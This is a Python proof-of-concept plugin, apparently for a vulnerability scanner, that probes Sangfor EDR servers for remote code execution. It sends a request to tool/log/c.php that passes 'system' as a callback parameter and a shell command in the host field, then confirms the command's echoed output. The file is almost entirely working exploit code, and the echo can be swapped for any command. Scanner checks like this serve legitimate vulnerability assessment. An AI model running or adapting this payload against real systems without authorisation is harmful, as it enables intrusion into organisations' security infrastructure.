#!/usr/bin/env python
# -*- encoding: utf-8 -*-

import random
from lib.utils.connect import ClientSession
from lib.core.enums import VUL_LEVEL
from lib.core.enums import VUL_TYPE
from lib.core.enums import SERVICE_PORT_MAP
from script import Script

class POC(Script):
    def __init__(self, target=None):
        self.service_type = SERVICE_PORT_MAP.WEB
        self.name = 'sangfor edr rce'
        self.keyword = ['sangfor', 'bsh']
        self.info = 'sangfor edr rce'
        self.type = VUL_TYPE.RCE
        self.level = VUL_LEVEL.HIGH
        Script.__init__(self, target=target, service_type=self.service_type)

    async def prove(self):
        await self.get_url()
        if self.base_url:
            path_list = list(set([
                self.url_normpath(self.base_url, '/'),
                self.url_normpath(self.url, './'),
            ]))
            headers = {
                "Content-Type": "application/x-www-form-urlencoded",
            }
            random_str = str(random.randint(100000, 999999))
            async with ClientSession() as session:
                for path in path_list:
                    url = path + "tool/log/c.php?strip_slashes=system&host=echo " + random_str
                    async with session.get(url=url, headers=headers) as response:
                        if response!=None:
                            text = await response.text()
                            if int(response.status) == 200 and 'Log Helper' in text and random_str in text:
                                self.flag = 1
                                self.req.append({"url": url})
                                self.res.append({"info": url, "key": "sangfor edr rce"})
                                return